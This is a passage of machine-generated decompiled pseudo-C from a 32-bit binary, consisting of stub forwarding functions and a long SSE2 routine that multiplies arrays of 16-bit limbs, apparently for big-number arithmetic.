int sub_4476C7()
{
  return sub_447704();
}
// 447704: using guessed type int sub_447704(void);

//----- (00447704) --------------------------------------------------------
int sub_447704()
{
  return sub_447741();
}
// 447741: using guessed type int sub_447741(void);

//----- (00447741) --------------------------------------------------------
int sub_447741()
{
  return sub_44777E();
}
// 44777E: using guessed type int sub_44777E(void);

//----- (0044777E) --------------------------------------------------------
__m128i __usercall sub_44777E@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>)
{
  return _mm_srli_epi32(_mm_mul_epu32(_mm_load_si128((const __m128i *)(a1 - 16)), _mm_load_si128(a2 + 1)), 0x10u);
}

//----- (00447C80) --------------------------------------------------------
int __cdecl sub_447C80(int a1, int a2, int a3)
{
  unsigned int i; // edx
  __m128i v4; // xmm0
  __m128i v5; // xmm1
  __m128i v6; // xmm2
  __m128i v7; // xmm7
  __m128i v8; // xmm5
  __m128i si128; // xmm6
  __m128i v10; // xmm4
  __m128i v11; // xmm7
  __m128i v12; // xmm6
  __m128i v13; // xmm7
  __m128i v14; // xmm0
  __m128i v15; // xmm1
  __m128i v16; // xmm4
  __m128i v17; // xmm5
  __m128i v18; // xmm6
  __m128i v19; // xmm5
  __m128i v20; // xmm4
  __m128i v21; // xmm7
  __m128i v22; // xmm0
  __m128i v23; // xmm7
  __m128i v24; // xmm6
  __m128i v25; // xmm4
  __m128i v26; // xmm5
  __m128i v27; // xmm6
  __m128i v28; // xmm7
  __m128i v29; // xmm0
  __m128i v30; // xmm1
  __m128i v31; // xmm4
  __m128i v32; // xmm5
  int v33; // ecx
  __m128i v34; // xmm6
  __m128i v35; // xmm5
  __m128i v36; // xmm4
  __m128i v37; // xmm7
  __m128i v38; // xmm0
  __m128i *v39; // edx
  __m128i v40; // xmm7
  __m128i v41; // xmm6
  __m128i v42; // xmm4
  __m128i v43; // xmm5
  __m128i v44; // xmm6
  __m128i v45; // xmm7
  __m128i v46; // xmm0
  __m128i v47; // xmm1
  __m128i v48; // xmm4
  __m128i v49; // xmm5
  int v50; // ecx
  __m128i v51; // xmm6
  __m128i v52; // xmm5
  __m128i v53; // xmm4
  __m128i *v54; // edx
  __m128i v55; // xmm7
  __m128i v56; // xmm0
  __m128i v57; // xmm7
  __m128i v58; // xmm6
  __m128i v59; // xmm4
  __m128i v60; // xmm5
  __m128i v61; // xmm6
  __m128i v62; // xmm7
  __m128i v63; // xmm0
  __m128i v64; // xmm1
  __m128i v65; // xmm4
  __m128i v66; // xmm5
  int v67; // ecx
  __m128i v68; // xmm6
  __m128i v69; // xmm5
  __m128i v70; // xmm4
  __m128i v71; // xmm7
  __m128i v72; // xmm0
  __m128i *v73; // edx
  __m128i v74; // xmm7
  __m128i v75; // xmm6
  __m128i v76; // xmm4
  __m128i v77; // xmm5
  __m128i v78; // xmm6
  __m128i v79; // xmm7
  __m128i v80; // xmm0
  __m128i v81; // xmm1
  __m128i v82; // xmm4
  __m128i v83; // xmm5
  int v84; // ecx
  __m128i v85; // xmm6
  __m128i v86; // xmm5
  __m128i v87; // xmm4
  __m128i *v88; // edx
  __m128i v89; // xmm7
  __m128i v90; // xmm0
  __m128i v91; // xmm7
  __m128i v92; // xmm6
  __m128i v93; // xmm4
  __m128i v94; // xmm5
  __m128i v95; // xmm6
  __m128i v96; // xmm7
  __m128i v97; // xmm0
  __m128i v98; // xmm1
  __m128i v99; // xmm4
  __m128i v100; // xmm5
  int v101; // ecx
  __m128i v102; // xmm6
  __m128i v103; // xmm5
  __m128i v104; // xmm4
  __m128i v105; // xmm7
  __m128i v106; // xmm0
  __m128i *v107; // edx
  __m128i v108; // xmm7
  __m128i v109; // xmm6
  __m128i v110; // xmm4
  __m128i v111; // xmm5
  __m128i v112; // xmm6
  __m128i v113; // xmm7
  __m128i v114; // xmm0
  __m128i v115; // xmm1
  __m128i v116; // xmm4
  __m128i v117; // xmm5
  int v118; // ecx
  __m128i v119; // xmm6
  __m128i v120; // xmm5
  __m128i v121; // xmm4
  __m128i *v122; // edx
  __m128i v123; // xmm7
  __m128i v124; // xmm0
  __m128i v125; // xmm7
  __m128i v126; // xmm6
  __m128i v127; // xmm4
  __m128i v128; // xmm5
  __m128i v129; // xmm6
  __m128i v130; // xmm7
  __m128i v131; // xmm0
  __m128i v132; // xmm1
  __m128i v133; // xmm4
  __m128i v134; // xmm5
  int v135; // ecx
  __m128i v136; // xmm6
  __m128i v137; // xmm5
  __m128i v138; // xmm4
  __m128i v139; // xmm7
  __m128i v140; // xmm0
  __m128i *v141; // edx
  __m128i v142; // xmm7
  __m128i v143; // xmm6
  __m128i v144; // xmm4
  __m128i v145; // xmm5
  __m128i v146; // xmm6
  __m128i v147; // xmm7
  __m128i v148; // xmm0
  __m128i v149; // xmm1
  __m128i v150; // xmm4
  __m128i v151; // xmm5
  int v152; // ecx
  __m128i v153; // xmm6
  __m128i v154; // xmm5
  __m128i v155; // xmm4
  __m128i *v156; // edx
  __m128i v157; // xmm7
  __m128i v158; // xmm0
  __m128i v159; // xmm7
  __m128i v160; // xmm6
  __m128i v161; // xmm4
  __m128i v162; // xmm5
  __m128i v163; // xmm6
  __m128i v164; // xmm7
  __m128i v165; // xmm0
  __m128i v166; // xmm1
  __m128i v167; // xmm4
  __m128i v168; // xmm5
  int v169; // ecx
  __m128i v170; // xmm6
  __m128i v171; // xmm5
  __m128i v172; // xmm4
  __m128i v173; // xmm7
  __m128i v174; // xmm0
  __m128i *v175; // edx
  __m128i v176; // xmm7
  __m128i v177; // xmm6
  __m128i v178; // xmm4
  __m128i v179; // xmm5
  __m128i v180; // xmm6
  __m128i v181; // xmm7
  __m128i v182; // xmm0
  __m128i v183; // xmm1
  __m128i v184; // xmm4
  __m128i v185; // xmm5
  int v186; // ecx
  __m128i v187; // xmm6
  __m128i v188; // xmm5
  __m128i v189; // xmm4
  __m128i *v190; // edx
  __m128i v191; // xmm7
  __m128i v192; // xmm0
  __m128i v193; // xmm7
  __m128i v194; // xmm6
  __m128i v195; // xmm4
  __m128i v196; // xmm5
  __m128i v197; // xmm6
  __m128i v198; // xmm7
  __m128i v199; // xmm0
  __m128i v200; // xmm1
  __m128i v201; // xmm4
  __m128i v202; // xmm5
  int v203; // ecx
  __m128i v204; // xmm6
  __m128i v205; // xmm5
  __m128i v206; // xmm4
  __m128i v207; // xmm7
  __m128i v208; // xmm0
  __m128i *v209; // edx
  __m128i v210; // xmm7
  __m128i v211; // xmm6
  __m128i v212; // xmm4
  __m128i v213; // xmm5
  __m128i v214; // xmm6
  __m128i v215; // xmm7
  __m128i v216; // xmm0
  __m128i v217; // xmm1
  __m128i v218; // xmm4
  __m128i v219; // xmm5
  int v220; // ecx
  __m128i v221; // xmm6
  __m128i v222; // xmm5
  __m128i v223; // xmm4
  __m128i *v224; // edx
  __m128i v225; // xmm7
  __m128i v226; // xmm0
  __m128i v227; // xmm7
  __m128i v228; // xmm6
  __m128i v229; // xmm4
  __m128i v230; // xmm5
  __m128i v231; // xmm6
  __m128i v232; // xmm7
  __m128i v233; // xmm0
  __m128i v234; // xmm1
  __m128i v235; // xmm4
  __m128i v236; // xmm5
  int v237; // ecx
  __m128i v238; // xmm6
  __m128i v239; // xmm5
  __m128i v240; // xmm4
  __m128i v241; // xmm7
  __m128i v242; // xmm0
  __m128i *v243; // edx
  __m128i v244; // xmm7
  __m128i v245; // xmm6
  __m128i v246; // xmm4
  __m128i v247; // xmm5
  __m128i v248; // xmm6
  __m128i v249; // xmm7
  int result; // eax
  __m128i v251; // xmm0
  __m128i v252; // xmm1
  __m128i v253; // xmm4
  __m128i v254; // xmm5
  __m128 v255; // xmm7
  int v256; // ecx
  __m128i v257; // xmm6
  __m128i v258; // xmm4
  __m128i *v259; // edx
  __m128i v260; // xmm6
  __m128i v261; // xmm1
  __m128i v262; // xmm4
  __m128i v263; // xmm6
  __m128i v264; // xmm1
  __m128i v265; // xmm4
  __m128i v266; // xmm6
  __m128i v267; // xmm1
  __m128i v268; // xmm4
  __m128i v269; // xmm6
  __m128i v270; // xmm1
  __m128i v271; // xmm4
  __m128i v272; // xmm6
  __m128i v273; // xmm1
  __m128i v274; // xmm4
  __m128i v275; // xmm6
  __m128i v276; // xmm1
  __m128i v277; // xmm4
  __m128i v278; // xmm6
  __m128i v279; // xmm1
  __m128i v280; // xmm4
  __m128i v281; // xmm6
  __m128i v282; // xmm1
  __m128i v283; // xmm4
  __m128i v284; // xmm6
  __m128i v285; // xmm1
  __m128i v286; // xmm4
  __m128i v287; // xmm6
  __m128i v288; // xmm1
  __m128i v289; // xmm4
  __m128i v290; // xmm6
  __m128i v291; // xmm1
  __m128i v292; // xmm4
  __m128i v293; // xmm6
  __m128i v294; // xmm1
  __m128i v295; // xmm4
  __m128i v296; // xmm6
  __m128i v297; // xmm1
  __m128i v298; // xmm4
  __m128i v299; // xmm6
  __m128i v300; // xmm1
  __m128i v301; // xmm4
  __m128i v302; // xmm6
  __m128i v303; // xmm1
  __m128 v304; // xmm6
  __m128i v305; // [esp+10h] [ebp-30Ch] BYREF
  __m128i v306; // [esp+20h] [ebp-2FCh] BYREF
  __m128i v307; // [esp+30h] [ebp-2ECh] BYREF
  __m128i v308; // [esp+40h] [ebp-2DCh] BYREF
  __m128i v309; // [esp+50h] [ebp-2CCh] BYREF
  __m128i v310; // [esp+60h] [ebp-2BCh] BYREF
  __m128i v311; // [esp+70h] [ebp-2ACh] BYREF
  __m128i v312; // [esp+80h] [ebp-29Ch] BYREF
  __m128i v313; // [esp+90h] [ebp-28Ch] BYREF
  __m128i v314; // [esp+A0h] [ebp-27Ch] BYREF
  __m128i v315; // [esp+B0h] [ebp-26Ch] BYREF
  __m128i v316; // [esp+C0h] [ebp-25Ch] BYREF
  __m128i v317; // [esp+D0h] [ebp-24Ch] BYREF
  __m128i v318; // [esp+E0h] [ebp-23Ch] BYREF
  __m128i v319; // [esp+F0h] [ebp-22Ch] BYREF
  __m128i v320; // [esp+100h] [ebp-21Ch] BYREF
  __m128i v321; // [esp+110h] [ebp-20Ch]
  __m128i v322[15]; // [esp+120h] [ebp-1FCh]
  __m128i v323; // [esp+210h] [ebp-10Ch] BYREF
  __m128i v324; // [esp+220h] [ebp-FCh] BYREF
  __m128i v325; // [esp+230h] [ebp-ECh] BYREF
  __m128i v326; // [esp+240h] [ebp-DCh] BYREF
  __m128i v327; // [esp+250h] [ebp-CCh] BYREF
  __m128i v328; // [esp+260h] [ebp-BCh] BYREF
  __m128i v329; // [esp+270h] [ebp-ACh] BYREF
  __m128i v330; // [esp+280h] [ebp-9Ch] BYREF
  __m128i v331; // [esp+290h] [ebp-8Ch] BYREF
  __m128i v332; // [esp+2A0h] [ebp-7Ch] BYREF
  __m128i v333; // [esp+2B0h] [ebp-6Ch] BYREF
  __m128i v334; // [esp+2C0h] [ebp-5Ch] BYREF
  __m128i v335; // [esp+2D0h] [ebp-4Ch] BYREF
  __m128i v336; // [esp+2E0h] [ebp-3Ch] BYREF
  __m128i v337; // [esp+2F0h] [ebp-2Ch] BYREF
  __m128i v338; // [esp+300h] [ebp-1Ch] BYREF

  for ( i = 0; i != 128; i += 16 )
  {
    v4 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 216);
    v5 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 141);
    v6 = _mm_shuffle_epi32(*(__m128i *)(a3 + i), 216);
    *(__m128i *)((char *)&v305 + 2 * i) = v4;
    *(__m128i *)((char *)&v306 + 2 * i) = _mm_srli_epi64(v4, 0x20u);
    *(__m128i *)((char *)&v321 + 2 * i) = v5;
    v322[i / 8] = _mm_srli_epi64(v5, 0x20u);
    *(__m128i *)((char *)&v323 + 2 * i) = v6;
    *(__m128i *)((char *)&v324 + 2 * i) = _mm_srli_epi64(v6, 0x20u);
  }
  v7 = _mm_load_si128(&v323);
  v8 = _mm_mul_epu32(_mm_load_si128(&v305), v7);
  si128 = _mm_load_si128(&stru_4BACE0);
  v10 = _mm_and_si128(si128, v8);
  v11 = _mm_mul_epu32(v7, v321);
  v12 = _mm_and_si128(si128, v11);
  v13 = _mm_srli_epi32(v11, 0x10u);
  v14 = _mm_move_epi64(v12);
  v15 = _mm_move_epi64(v13);
  v16 = _mm_add_epi32(v10, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v12, v14), v14), 4));
  v17 = _mm_add_epi32(_mm_srli_epi32(v8, 0x10u), _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v13, v15), v15), 4));
  *(_DWORD *)a1 = _mm_cvtsi128_si32(v16);
  v18 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v16), 0x10u), _mm_move_epi64(v17));
  v19 = _mm_unpackhi_epi64(v17, v14);
  *(_QWORD *)(a1 + 2) = v18.m128i_i64[0];
  v20 = _mm_add_epi32(_mm_unpackhi_epi64(v16, v14), _mm_srli_epi64(v18, 0x30u));
  v21 = _mm_load_si128(&v323);
  v22 = _mm_mul_epu32(_mm_load_si128(&v306), v21);
  v23 = _mm_mul_epu32(v21, v322[0]);
  v24 = _mm_load_si128(&stru_4BACE0);
  v25 = _mm_add_epi32(v20, _mm_and_si128(v24, v22));
  v26 = _mm_add_epi32(v19, _mm_srli_epi32(v22, 0x10u));
  v27 = _mm_and_si128(v24, v23);
  v28 = _mm_srli_epi32(v23, 0x10u);
  sub_448059((int)&v306, &v323);
  v29 = _mm_move_epi64(v27);
  v30 = _mm_move_epi64(v28);
  v31 = _mm_add_epi32(v25, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v27, v29), v29), 4));
  v32 = _mm_add_epi32(v26, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v28, v30), v30), 4));
  *(_DWORD *)(v33 + 8) = _mm_cvtsi128_si32(v31);
  v34 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v31), 0x10u), _mm_move_epi64(v32));
  v35 = _mm_unpackhi_epi64(v32, v29);
  *(_QWORD *)(v33 + 10) = v34.m128i_i64[0];
  v36 = _mm_add_epi32(_mm_unpackhi_epi64(v31, v29), _mm_srli_epi64(v34, 0x30u));
  v37 = _mm_load_si128(&v324);
  v38 = _mm_mul_epu32(_mm_load_si128(&v306), v37);
  v40 = _mm_mul_epu32(v37, *v39);
  v41 = _mm_load_si128(&stru_4BACE0);
  v42 = _mm_add_epi32(v36, _mm_and_si128(v41, v38));
  v43 = _mm_add_epi32(v35, _mm_srli_epi32(v38, 0x10u));
  v44 = _mm_and_si128(v41, v40);
  v45 = _mm_srli_epi32(v40, 0x10u);
  sub_44801C();
  v46 = _mm_move_epi64(v44);
  v47 = _mm_move_epi64(v45);
  v48 = _mm_add_epi32(v42, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v44, v46), v46), 4));
  v49 = _mm_add_epi32(v43, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v45, v47), v47), 4));
  *(_DWORD *)(v50 + 16) = _mm_cvtsi128_si32(v48);
  v51 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v48), 0x10u), _mm_move_epi64(v49));
  v52 = _mm_unpackhi_epi64(v49, v46);
  *(_QWORD *)(v50 + 18) = v51.m128i_i64[0];
  v53 = _mm_add_epi32(_mm_unpackhi_epi64(v48, v46), _mm_srli_epi64(v51, 0x30u));
  v55 = _mm_load_si128(&v324);
  v56 = _mm_mul_epu32(_mm_load_si128(&v307), v55);
  v57 = _mm_mul_epu32(v55, v54[1]);
  v58 = _mm_load_si128(&stru_4BACE0);
  v59 = _mm_add_epi32(v53, _mm_and_si128(v58, v56));
  v60 = _mm_add_epi32(v52, _mm_srli_epi32(v56, 0x10u));
  v61 = _mm_and_si128(v58, v57);
  v62 = _mm_srli_epi32(v57, 0x10u);
  sub_447FDF();
  v63 = _mm_move_epi64(v61);
  v64 = _mm_move_epi64(v62);
  v65 = _mm_add_epi32(v59, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v61, v63), v63), 4));
  v66 = _mm_add_epi32(v60, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v62, v64), v64), 4));
  *(_DWORD *)(v67 + 24) = _mm_cvtsi128_si32(v65);
  v68 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v65), 0x10u), _mm_move_epi64(v66));
  v69 = _mm_unpackhi_epi64(v66, v63);
  *(_QWORD *)(v67 + 26) = v68.m128i_i64[0];
  v70 = _mm_add_epi32(_mm_unpackhi_epi64(v65, v63), _mm_srli_epi64(v68, 0x30u));
  v71 = _mm_load_si128(&v325);
  v72 = _mm_mul_epu32(_mm_load_si128(&v307), v71);
  v74 = _mm_mul_epu32(v71, *v73);
  v75 = _mm_load_si128(&stru_4BACE0);
  v76 = _mm_add_epi32(v70, _mm_and_si128(v75, v72));
  v77 = _mm_add_epi32(v69, _mm_srli_epi32(v72, 0x10u));
  v78 = _mm_and_si128(v75, v74);
  v79 = _mm_srli_epi32(v74, 0x10u);
  sub_447FA2();
  v80 = _mm_move_epi64(v78);
  v81 = _mm_move_epi64(v79);
  v82 = _mm_add_epi32(v76, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v78, v80), v80), 4));
  v83 = _mm_add_epi32(v77, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v79, v81), v81), 4));
  *(_DWORD *)(v84 + 32) = _mm_cvtsi128_si32(v82);
  v85 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v82), 0x10u), _mm_move_epi64(v83));
  v86 = _mm_unpackhi_epi64(v83, v80);
  *(_QWORD *)(v84 + 34) = v85.m128i_i64[0];
  v87 = _mm_add_epi32(_mm_unpackhi_epi64(v82, v80), _mm_srli_epi64(v85, 0x30u));
  v89 = _mm_load_si128(&v325);
  v90 = _mm_mul_epu32(_mm_load_si128(&v308), v89);
  v91 = _mm_mul_epu32(v89, v88[1]);
  v92 = _mm_load_si128(&stru_4BACE0);
  v93 = _mm_add_epi32(v87, _mm_and_si128(v92, v90));
  v94 = _mm_add_epi32(v86, _mm_srli_epi32(v90, 0x10u));
  v95 = _mm_and_si128(v92, v91);
  v96 = _mm_srli_epi32(v91, 0x10u);
  sub_447F65();
  v97 = _mm_move_epi64(v95);
  v98 = _mm_move_epi64(v96);
  v99 = _mm_add_epi32(v93, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v95, v97), v97), 4));
  v100 = _mm_add_epi32(v94, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v96, v98), v98), 4));
  *(_DWORD *)(v101 + 40) = _mm_cvtsi128_si32(v99);
  v102 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v99), 0x10u), _mm_move_epi64(v100));
  v103 = _mm_unpackhi_epi64(v100, v97);
  *(_QWORD *)(v101 + 42) = v102.m128i_i64[0];
  v104 = _mm_add_epi32(_mm_unpackhi_epi64(v99, v97), _mm_srli_epi64(v102, 0x30u));
  v105 = _mm_load_si128(&v326);
  v106 = _mm_mul_epu32(_mm_load_si128(&v308), v105);
  v108 = _mm_mul_epu32(v105, *v107);
  v109 = _mm_load_si128(&stru_4BACE0);
  v110 = _mm_add_epi32(v104, _mm_and_si128(v109, v106));
  v111 = _mm_add_epi32(v103, _mm_srli_epi32(v106, 0x10u));
  v112 = _mm_and_si128(v109, v108);
  v113 = _mm_srli_epi32(v108, 0x10u);
  sub_447F28();
  v114 = _mm_move_epi64(v112);
  v115 = _mm_move_epi64(v113);
  v116 = _mm_add_epi32(v110, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v112, v114), v114), 4));
  v117 = _mm_add_epi32(v111, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v113, v115), v115), 4));
  *(_DWORD *)(v118 + 48) = _mm_cvtsi128_si32(v116);
  v119 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v116), 0x10u), _mm_move_epi64(v117));
  v120 = _mm_unpackhi_epi64(v117, v114);
  *(_QWORD *)(v118 + 50) = v119.m128i_i64[0];
  v121 = _mm_add_epi32(_mm_unpackhi_epi64(v116, v114), _mm_srli_epi64(v119, 0x30u));
  v123 = _mm_load_si128(&v326);
  v124 = _mm_mul_epu32(_mm_load_si128(&v309), v123);
  v125 = _mm_mul_epu32(v123, v122[1]);
  v126 = _mm_load_si128(&stru_4BACE0);
  v127 = _mm_add_epi32(v121, _mm_and_si128(v126, v124));
  v128 = _mm_add_epi32(v120, _mm_srli_epi32(v124, 0x10u));
  v129 = _mm_and_si128(v126, v125);
  v130 = _mm_srli_epi32(v125, 0x10u);
  sub_447EEB();
  v131 = _mm_move_epi64(v129);
  v132 = _mm_move_epi64(v130);
  v133 = _mm_add_epi32(v127, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v129, v131), v131), 4));
  v134 = _mm_add_epi32(v128, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v130, v132), v132), 4));
  *(_DWORD *)(v135 + 56) = _mm_cvtsi128_si32(v133);
  v136 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v133), 0x10u), _mm_move_epi64(v134));
  v137 = _mm_unpackhi_epi64(v134, v131);
  *(_QWORD *)(v135 + 58) = v136.m128i_i64[0];
  v138 = _mm_add_epi32(_mm_unpackhi_epi64(v133, v131), _mm_srli_epi64(v136, 0x30u));
  v139 = _mm_load_si128(&v327);
  v140 = _mm_mul_epu32(_mm_load_si128(&v309), v139);
  v142 = _mm_mul_epu32(v139, *v141);
  v143 = _mm_load_si128(&stru_4BACE0);
  v144 = _mm_add_epi32(v138, _mm_and_si128(v143, v140));
  v145 = _mm_add_epi32(v137, _mm_srli_epi32(v140, 0x10u));
  v146 = _mm_and_si128(v143, v142);
  v147 = _mm_srli_epi32(v142, 0x10u);
  sub_447EAE();
  v148 = _mm_move_epi64(v146);
  v149 = _mm_move_epi64(v147);
  v150 = _mm_add_epi32(v144, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v146, v148), v148), 4));
  v151 = _mm_add_epi32(v145, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v147, v149), v149), 4));
  *(_DWORD *)(v152 + 64) = _mm_cvtsi128_si32(v150);
  v153 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v150), 0x10u), _mm_move_epi64(v151));
  v154 = _mm_unpackhi_epi64(v151, v148);
  *(_QWORD *)(v152 + 66) = v153.m128i_i64[0];
  v155 = _mm_add_epi32(_mm_unpackhi_epi64(v150, v148), _mm_srli_epi64(v153, 0x30u));
  v157 = _mm_load_si128(&v327);
  v158 = _mm_mul_epu32(_mm_load_si128(&v310), v157);
  v159 = _mm_mul_epu32(v157, v156[1]);
  v160 = _mm_load_si128(&stru_4BACE0);
  v161 = _mm_add_epi32(v155, _mm_and_si128(v160, v158));
  v162 = _mm_add_epi32(v154, _mm_srli_epi32(v158, 0x10u));
  v163 = _mm_and_si128(v160, v159);
  v164 = _mm_srli_epi32(v159, 0x10u);
  sub_447E71();
  v165 = _mm_move_epi64(v163);
  v166 = _mm_move_epi64(v164);
  v167 = _mm_add_epi32(v161, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v163, v165), v165), 4));
  v168 = _mm_add_epi32(v162, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v164, v166), v166), 4));
  *(_DWORD *)(v169 + 72) = _mm_cvtsi128_si32(v167);
  v170 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v167), 0x10u), _mm_move_epi64(v168));
  v171 = _mm_unpackhi_epi64(v168, v165);
  *(_QWORD *)(v169 + 74) = v170.m128i_i64[0];
  v172 = _mm_add_epi32(_mm_unpackhi_epi64(v167, v165), _mm_srli_epi64(v170, 0x30u));
  v173 = _mm_load_si128(&v328);
  v174 = _mm_mul_epu32(_mm_load_si128(&v310), v173);
  v176 = _mm_mul_epu32(v173, *v175);
  v177 = _mm_load_si128(&stru_4BACE0);
  v178 = _mm_add_epi32(v172, _mm_and_si128(v177, v174));
  v179 = _mm_add_epi32(v171, _mm_srli_epi32(v174, 0x10u));
  v180 = _mm_and_si128(v177, v176);
  v181 = _mm_srli_epi32(v176, 0x10u);
  sub_447E34();
  v182 = _mm_move_epi64(v180);
  v183 = _mm_move_epi64(v181);
  v184 = _mm_add_epi32(v178, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v180, v182), v182), 4));
  v185 = _mm_add_epi32(v179, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v181, v183), v183), 4));
  *(_DWORD *)(v186 + 80) = _mm_cvtsi128_si32(v184);
  v187 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v184), 0x10u), _mm_move_epi64(v185));
  v188 = _mm_unpackhi_epi64(v185, v182);
  *(_QWORD *)(v186 + 82) = v187.m128i_i64[0];
  v189 = _mm_add_epi32(_mm_unpackhi_epi64(v184, v182), _mm_srli_epi64(v187, 0x30u));
  v191 = _mm_load_si128(&v328);
  v192 = _mm_mul_epu32(_mm_load_si128(&v311), v191);
  v193 = _mm_mul_epu32(v191, v190[1]);
  v194 = _mm_load_si128(&stru_4BACE0);
  v195 = _mm_add_epi32(v189, _mm_and_si128(v194, v192));
  v196 = _mm_add_epi32(v188, _mm_srli_epi32(v192, 0x10u));
  v197 = _mm_and_si128(v194, v193);
  v198 = _mm_srli_epi32(v193, 0x10u);
  sub_447DF7();
  v199 = _mm_move_epi64(v197);
  v200 = _mm_move_epi64(v198);
  v201 = _mm_add_epi32(v195, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v197, v199), v199), 4));
  v202 = _mm_add_epi32(v196, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v198, v200), v200), 4));
  *(_DWORD *)(v203 + 88) = _mm_cvtsi128_si32(v201);
  v204 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v201), 0x10u), _mm_move_epi64(v202));
  v205 = _mm_unpackhi_epi64(v202, v199);
  *(_QWORD *)(v203 + 90) = v204.m128i_i64[0];
  v206 = _mm_add_epi32(_mm_unpackhi_epi64(v201, v199), _mm_srli_epi64(v204, 0x30u));
  v207 = _mm_load_si128(&v329);
  v208 = _mm_mul_epu32(_mm_load_si128(&v311), v207);
  v210 = _mm_mul_epu32(v207, *v209);
  v211 = _mm_load_si128(&stru_4BACE0);
  v212 = _mm_add_epi32(v206, _mm_and_si128(v211, v208));
  v213 = _mm_add_epi32(v205, _mm_srli_epi32(v208, 0x10u));
  v214 = _mm_and_si128(v211, v210);
  v215 = _mm_srli_epi32(v210, 0x10u);
  sub_447DBA();
  v216 = _mm_move_epi64(v214);
  v217 = _mm_move_epi64(v215);
  v218 = _mm_add_epi32(v212, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v214, v216), v216), 4));
  v219 = _mm_add_epi32(v213, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v215, v217), v217), 4));
  *(_DWORD *)(v220 + 96) = _mm_cvtsi128_si32(v218);
  v221 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v218), 0x10u), _mm_move_epi64(v219));
  v222 = _mm_unpackhi_epi64(v219, v216);
  *(_QWORD *)(v220 + 98) = v221.m128i_i64[0];
  v223 = _mm_add_epi32(_mm_unpackhi_epi64(v218, v216), _mm_srli_epi64(v221, 0x30u));
  v225 = _mm_load_si128(&v329);
  v226 = _mm_mul_epu32(_mm_load_si128(&v312), v225);
  v227 = _mm_mul_epu32(v225, v224[1]);
  v228 = _mm_load_si128(&stru_4BACE0);
  v229 = _mm_add_epi32(v223, _mm_and_si128(v228, v226));
  v230 = _mm_add_epi32(v222, _mm_srli_epi32(v226, 0x10u));
  v231 = _mm_and_si128(v228, v227);
  v232 = _mm_srli_epi32(v227, 0x10u);
  sub_447D7D();
  v233 = _mm_move_epi64(v231);
  v234 = _mm_move_epi64(v232);
  v235 = _mm_add_epi32(v229, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v231, v233), v233), 4));
  v236 = _mm_add_epi32(v230, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v232, v234), v234), 4));
  *(_DWORD *)(v237 + 104) = _mm_cvtsi128_si32(v235);
  v238 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v235), 0x10u), _mm_move_epi64(v236));
  v239 = _mm_unpackhi_epi64(v236, v233);
  *(_QWORD *)(v237 + 106) = v238.m128i_i64[0];
  v240 = _mm_add_epi32(_mm_unpackhi_epi64(v235, v233), _mm_srli_epi64(v238, 0x30u));
  v241 = _mm_load_si128(&v330);
  v242 = _mm_mul_epu32(_mm_load_si128(&v312), v241);
  v244 = _mm_mul_epu32(v241, *v243);
  v245 = _mm_load_si128(&stru_4BACE0);
  v246 = _mm_add_epi32(v240, _mm_and_si128(v245, v242));
  v247 = _mm_add_epi32(v239, _mm_srli_epi32(v242, 0x10u));
  v248 = _mm_and_si128(v245, v244);
  v249 = _mm_srli_epi32(v244, 0x10u);
  result = sub_447D40();
  v251 = _mm_move_epi64(v248);
  v252 = _mm_move_epi64(v249);
  v253 = _mm_add_epi32(v246, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v248, v251), v251), 4));
  v254 = _mm_add_epi32(v247, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v249, v252), v252), 4));
  v255 = (__m128)_mm_move_epi64(v254);
  *(_DWORD *)(v256 + 112) = _mm_cvtsi128_si32(v253);
  v257 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v253), 0x10u), (__m128i)v255);
  *(_QWORD *)(v256 + 114) = v257.m128i_i64[0];
